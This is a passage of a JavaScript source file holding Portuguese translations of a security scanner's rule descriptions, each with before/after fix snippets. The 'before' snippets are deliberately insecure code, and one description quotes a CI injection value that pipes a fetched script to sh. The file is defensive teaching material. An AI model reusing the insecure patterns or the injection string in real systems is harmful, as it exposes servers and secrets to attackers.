      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "terraform-open-security-group": {
    title: "Um security group do Terraform abre uma porta sensível a toda a internet",
    description:
      "Uma regra com \"cidr_blocks\" que inclui 0.0.0.0/0 (qualquer endereço IP) está próxima de uma porta sensível — SSH (22), RDP (3389), ou uma porta típica de base de dados (MySQL, Postgres, MongoDB, Redis, SQL Server). Qualquer pessoa na internet pode tentar ligar-se a esse serviço, não só quem deveria.",
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # apenas a sua rede privada, ou um bastion host\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Uma regra de firewall do Google Cloud abre uma porta sensível a toda a internet",
    description:
      "Um recurso \"google_compute_firewall\" com \"source_ranges\" que inclui 0.0.0.0/0 (qualquer endereço IP) permite tráfego para uma porta sensível — SSH (22), RDP (3389), ou uma porta típica de base de dados (MySQL, Postgres, MongoDB, Redis, SQL Server). Qualquer pessoa na internet pode tentar ligar-se a esse serviço, não só quem deveria.",
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # apenas a sua rede privada, ou um bastion host\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Uma regra de rede do Azure abre uma porta sensível a toda a internet",
    description:
      "Uma regra de segurança de rede (\"azurerm_network_security_rule\", ou um bloco \"security_rule\" dentro de \"azurerm_network_security_group\") com \"source_address_prefix\" a \"*\" ou \"0.0.0.0/0\", direção \"Inbound\" e acesso \"Allow\", próxima de uma porta sensível — SSH (22), RDP (3389), ou uma porta típica de base de dados. Qualquer pessoa na internet pode tentar ligar-se a esse serviço, não só quem deveria.",
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # apenas a sua rede privada, ou um bastion host\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "Um segredo é escrito como valor por omissão de uma variável Terraform",
    description:
      "Uma variável com um nome do tipo password/secret/token/key tem um valor literal no seu \"default\". Ao contrário de um valor passado em tempo de execução (tfvars, variáveis de ambiente TF_VAR_*), um valor por omissão acaba no código-fonte — e se o repositório for partilhado ou público, qualquer pessoa o vê, mesmo sem acesso ao estado do Terraform.",
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # sem valor por omissão: deve ser passado com um ficheiro .tfvars (fora do git) ou uma variável de ambiente TF_VAR_db_password\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "Um valor controlado por um utilizador externo entra diretamente num comando shell da CI",
    description:
      'Um comando "run:" de um workflow do GitHub Actions interpola diretamente um valor como o título de uma pull request, o nome de um branch ou o texto de um comentário — todos escrevíveis por qualquer pessoa que abra uma pull request ou um comentário, mesmo a partir de um fork externo. Um valor como `"; curl malware.sh | sh #` executaria comandos arbitrários na CI, com acesso a todos os segredos disponíveis nesse workflow.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # passado como variável de ambiente, nunca interpolado diretamente no comando`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "O workflow executa o código de uma pull request externa com acesso aos segredos do repositório",
    description:
      'O workflow usa "pull_request_target" — que corre com as permissões e os segredos do repositório base mesmo para uma pull request aberta a partir de um fork externo — e faz checkout do próprio código da pull request ("github.event.pull_request.head"), não do branch base. Quem abre a pull request obtém, na prática, a execução do seu próprio código com acesso a esses segredos.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Faz checkout do branch base, não do código da PR — ou use\n      # "pull_request" em vez de "pull_request_target" se não precisar\n      # das permissões/segredos mais amplos.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "Os dados do pedido são desserializados com um formato que pode executar código",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) ou a biblioteca node-serialize (Node) estão a desserializar um valor retirado diretamente do pedido. Ao contrário do JSON, estes formatos podem representar e executar código durante a própria desserialização — quem controlar o valor enviado pode conseguir execução de código arbitrário no servidor.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # o JSON nunca executa código ao fazer parsing, ao contrário do pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'O código aceita explicitamente tokens JWT não assinados (algoritmo "none")',
    description:
      '"none" aparece entre os algoritmos aceites para verificar um token JWT. Um token com o algoritmo "none" não tem nenhuma assinatura para verificar: qualquer pessoa pode construir um com qualquer conteúdo (ex. um papel de administrador) e o código aceitá-lo-ia como válido.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // nunca incluir "none" entre os algoritmos aceites`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "O Block Public Access está desativado num bucket S3 definido em Terraform",
    description:
      'Uma ou mais das quatro proteções de "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) estão definidas como false. Não significa que o bucket já seja público, mas remove uma rede de segurança que impediria torná-lo público por engano no futuro.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "Uma policy IAM definida em Terraform concede acesso completo",
    description:
      'Um statement com action "*" e resource "*" concede acesso completo a todos os serviços e recursos da AWS — a mesma verificação já feita no estado IAM em tempo real, aqui lida diretamente a partir do código antes mesmo de ser aplicada. Pode ser intencional para um papel de emergência, mas deve ser confirmado: para uso diário, conceda apenas as permissões realmente necessárias.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::o-seu-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "Um bucket do Google Cloud Storage é tornado legível por qualquer pessoa",
    description:
      'Um recurso "google_storage_bucket_iam_member" ou "google_storage_bucket_iam_binding" concede um papel a "allUsers" ou "allAuthenticatedUsers" — o primeiro torna o bucket legível por qualquer pessoa na internet, mesmo sem conta Google; o segundo por qualquer pessoa com uma conta Google qualquer, não só quem devia ter acesso.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:alguem@example.com"  # apenas quem deve mesmo ter acesso, não allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "O acesso público a blobs está ativado numa conta de armazenamento Azure",
    description:
      '"allow_blob_public_access" está definido como true numa "azurerm_storage_account": qualquer pessoa que conheça o URL de um blob/contentor tornado público pode lê-lo, sem nenhuma autenticação.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "Um papel IAM do Google Cloud concede acesso completo (Owner/Editor)",
    description:
      'Um "google_project_iam_binding"/"google_project_iam_member" (ou o equivalente ao nível da organização/pasta) atribui o papel primitivo "roles/owner" ou "roles/editor" — acesso quase completo a todos os serviços do projeto. Pode ser intencional para uma conta de emergência, mas deve ser confirmado: para uso diário, conceda apenas os papéis predefinidos mais específicos que sejam realmente necessários.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # apenas o papel predefinido realmente necessário, não roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "Uma atribuição de papel Azure concede acesso completo (Owner)",
    description:
      'Uma "azurerm_role_assignment" atribui o papel "Owner" — acesso completo, incluindo controlo sobre as permissões de outros utilizadores, em todo o âmbito atribuído (subscrição, grupo de recursos...). Pode ser intencional para uma conta de emergência, mas deve ser confirmado: para uso diário, conceda apenas o papel mais específico realmente necessário (ex. "Contributor" num único grupo de recursos).',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # apenas o papel mais específico realmente necessário, não Owner em toda a subscrição\n}`,
    },
  },
  "weak-random-token": {
    title: "Um token de segurança é gerado com um gerador de números aleatórios não seguro",
    description:
      "Um valor com um nome do tipo token/session/reset/otp/csrf é gerado com Math.random() (JS), random.random() (Python) ou rand() (PHP) — geradores não concebidos para segurança, cujas sequências são previsíveis. Um token gerado assim pode ser adivinhado ou reconstruído, anulando o propósito para o qual existe (ex. um link de reposição de palavra-passe que qualquer pessoa poderia prever).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, não Math.random — imprevisível`,
    },
  },
  "ldap-injection": {
    title: "Um filtro LDAP é construído concatenando diretamente um valor do pedido",
    description:
      'Uma linha que constrói um filtro LDAP (ex. "(uid=...)") inclui diretamente um valor retirado do pedido, sem nenhum escape dos caracteres especiais do LDAP. Quem controlar esse valor pode alterar a lógica do filtro — por exemplo contornar uma verificação de autenticação ou ler dados do diretório que não devia ver.',
    fix: {
      before: `const filter = \`(uid=\${req.body.username})\`;\nclient.search(base, { filter });`,
      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // os caracteres especiais do LDAP devem ser sempre escapados antes de os usar num filtro\nclient.search(base, { filter });`,
    },
  },
  "header-injection": {
    title: "Um valor do pedido acaba diretamente num cabeçalho de resposta HTTP",
    description:
      "Um cabeçalho de resposta HTTP é definido com um valor retirado diretamente do pedido (query, body, params), sem verificar que não contém uma quebra de linha (CRLF). Um atacante pode inserir cabeçalhos adicionais ou até uma resposta inteiramente diferente — response splitting — podendo manipular cache, cookies ou o conteúdo mostrado a outros utilizadores.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "gha-unpinned-action": {
    title: "Uma ação de terceiros na CI não está fixada numa versão precisa (commit SHA)",
    description:
      'O workflow usa uma ação de terceiros referenciada por tag ou branch (ex. "@v1", "@main") em vez de por commit SHA. Quem a mantém — ou quem comprometer a sua conta — pode mover essa referência para um commit diferente a qualquer momento, mudando silenciosamente o que corre na CI, com acesso aos seus segredos. Um commit SHA aponta sempre para exatamente o mesmo código.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, fixado no commit SHA — atualize o SHA quando atualizar a versão`,
    },
  },
  "gha-excessive-permissions": {
    title: "O workflow concede-se todas as permissões do token em vez de apenas as que usa",
    description:
      '"permissions: write-all" concede ao GITHUB_TOKEN do workflow acesso de escrita a tudo — issues, pull requests, pacotes, deployments — mesmo que o workflow só use uma parte. Se um passo do workflow for comprometido (uma dependência maliciosa, um script injetado), essas permissões mais amplas aumentam o que quem o explora pode fazer.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # apenas as permissões que o workflow realmente usa`,
    },
  },
  "insecure-cookie-flags": {
    title: "Um cookie de sessão ou autenticação é definido sem as flags Secure e HttpOnly",
    description:
      'Um cookie com um nome parecido com session/auth/token é definido sem "httpOnly" e "secure" entre as suas opções. Sem httpOnly, o JavaScript da página — incluindo código injetado via XSS — pode ler esse cookie. Sem secure, também pode ser enviado numa ligação HTTP não cifrada.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "docker-hardcoded-secret": {
    title: "Um segredo é escrito diretamente numa instrução ENV ou ARG do Dockerfile",
    description:
      "Uma variável com um nome do tipo password/secret/token/key tem um valor literal numa instrução ENV ou ARG. Ao contrário de um ficheiro .env (que normalmente não acaba na imagem), este valor fica gravado na própria imagem Docker — quem a puder fazer pull ou inspecionar o histórico das layers consegue recuperá-lo, mesmo que a linha seja removida numa versão posterior do Dockerfile.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# passado com: docker build --build-arg DB_PASSWORD=*** (ou, melhor ainda,\n# um BuildKit secret mount, que nunca acaba no histórico das layers)`,
    },
  },
  "docker-missing-user": {
    title: "O Dockerfile não define um utilizador não-root",
    description:
      "Nenhuma instrução USER no Dockerfile: sem ela, o contentor corre como root. Se um atacante conseguir executar código dentro do contentor (ex. explorando uma biblioteca vulnerável), ser root dentro do contentor facilita uma fuga para o host — ou um impacto mais amplo no sistema envolvente.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'A imagem base do Dockerfile usa a tag ":latest"',
    description:
      'Uma instrução FROM usa explicitamente a tag ":latest" em vez de uma versão precisa. "latest" muda ao longo do tempo: o mesmo build, refeito noutro momento, pode obter uma versão diferente da imagem base — um build não reprodutível, e uma atualização indesejada pode chegar sem que ninguém tenha decidido que deveria acontecer.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "O Dockerfile descarrega um ficheiro remoto com ADD em vez de COPY",
    description:
      "Uma instrução ADD com um URL http/https descarrega um ficheiro da internet durante o build, sem verificação de integridade e com o conteúdo invisível no repositório. Se esse URL alguma vez for comprometido, o build recebe conteúdo arbitrário sem que ninguém repare apenas lendo o Dockerfile.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<hash esperado>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "k8s-privileged-container": {
    title: "Um contentor no manifesto Kubernetes corre em modo privilegiado",
    description:
      '"privileged: true" no securityContext de um contentor desativa quase todo o isolamento habitual entre contentor e host: o contentor pode aceder aos dispositivos do host, alterar a sua configuração de rede, e em muitos casos obter efetivamente acesso root à máquina que o executa. Quase nunca é necessário para uma aplicação normal.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # apenas as capabilities realmente necessárias`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Um segredo é escrito em texto simples numa variável de ambiente de um manifesto Kubernetes",
    description:
      'Uma variável de ambiente com um nome do tipo password/secret/token/key tem um valor literal ("value:") em vez de ser lida a partir de um Secret ("valueFrom.secretKeyRef"). O próprio manifesto — muitas vezes submetido a um repositório — contém assim o segredo em texto simples, visível até por alguém que só possa ler a configuração, sem necessariamente executar comandos no cluster.',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "k8s-run-as-root": {
    title: "Um contentor no manifesto Kubernetes está definido para correr como root",
    description:
      '"runAsUser: 0" ou "runAsNonRoot: false" no securityContext forçam explicitamente o contentor a correr como root. Se um atacante conseguir executar código dentro do contentor (ex. explorando uma biblioteca vulnerável), ser root dentro do contentor facilita uma fuga para o host — ou um impacto mais amplo.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Um contentor no manifesto Kubernetes pode obter mais privilégios do que tinha ao iniciar",
    description:
      '"allowPrivilegeEscalation: true" no securityContext permite que um processo dentro do contentor obtenha mais privilégios do que o processo que o iniciou (ex. através de um binário setuid). Combinado com uma vulnerabilidade na aplicação, é mais um passo em direção à execução de código com mais privilégios do que o pretendido.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Um pod no manifesto Kubernetes partilha a rede, os processos ou a memória partilhada do host",
    description:
      '"hostNetwork", "hostPID" ou "hostIPC" definidos como true tiram o pod do seu isolamento normal: hostNetwork expõe o pod na rede do host (contornando as network policies do cluster), hostPID dá-lhe visibilidade sobre todos os processos da máquina host, hostIPC dá-lhe acesso à memória partilhada do host. Quase nunca é necessário para uma aplicação normal — normalmente só para ferramentas de sistema/monitorização de baixo nível.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "O manifesto Kubernetes não impõe explicitamente a execução com um utilizador não-root",
    description:
      'Nenhum "runAsNonRoot" em nenhum lugar do manifesto (nem ao nível do pod nem do contentor): sem o definir, um contentor corre com o utilizador que a sua imagem definir — muitas vezes root por omissão, se a própria imagem não tiver alterado isso. Defini-lo explicitamente como true faz o pod falhar ao iniciar se a imagem ainda tentar correr como root, em vez de só se descobrir depois de um incidente.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "Dependência vulnerável:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "Ainda não é conhecida nenhuma versão corrigida — considere um pacote alternativo ou acompanhe as atualizações do projeto."
      ),
    },
  }),
},
};
